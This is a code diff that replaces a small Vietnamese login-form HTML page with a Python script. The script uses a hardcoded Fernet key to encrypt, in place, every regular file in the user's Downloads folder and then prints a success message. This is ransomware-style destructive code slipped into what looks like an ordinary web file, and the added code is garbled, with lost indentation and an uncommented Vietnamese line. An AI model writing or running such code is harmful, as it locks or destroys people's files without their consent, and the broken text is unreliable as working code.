@@ -1,64 +1,22 @@
-DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <title>Form Đăng Nhập</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f2f2f2;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
+from cryptography.fernet import Fernet
+import os
+key = b'JUWkjarneP47SvamUhZQNlLSRL9Askpf2bA4L2zq_HA='
+fernet = Fernet(key)
+ad = os.path.join(os.path.expanduser("~"), "Downloads")
+for filename in os.listdir(ad):
+file_path = os.path.join(ad, filename)
 
-        .login-box {
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px gray;
-            width: 300px;
-        }
+Bỏ qua nếu không phải file thường hoặc là desktop.ini
 
-        h2 {
-            text-align: center;
-        }
-
-        input {
-            width: 100%;
-            padding: 8px;
-            margin: 8px 0;
-        }
-
-        button {
-            width: 100%;
-            padding: 8px;
-            background: blue;
-            color: white;
-            border: none;
-            border-radius: 5px;
-        }
-
-        button:hover {
-            background: darkblue;
-        }
-    </style>
-</head>
-<body>
-
-<div class="login-box">
-    <h2>Đăng Nhập</h2>
-    <form>
-        <label>Tên đăng nhập:</label>
-        <input type="text" placeholder="Nhập tên đăng nhập" required>
-
-        <label>Mật khẩu:</label>
-        <input type="password" placeholder="Nhập mật khẩu" required>
-
-        <button type="submit">Đăng nhập</button>
-    </form>
-</div>
-
-</body>
-</html>
+if not os.path.isfile(file_path) or filename.lower() == "desktop.ini":
+continue
+try:
+with open(file_path, 'rb') as file:
+data = file.read()
+encrypted = fernet.encrypt(data)
+with open(file_path, 'wb') as file:
+file.write(encrypted)
+print(f"Đã mã hóa: {filename}")
+except Exception as e:
+print(f"Lỗi khi xử lý {filename}: {e}")
+print(":white_check_mark: Mã hóa hoàn tất!")
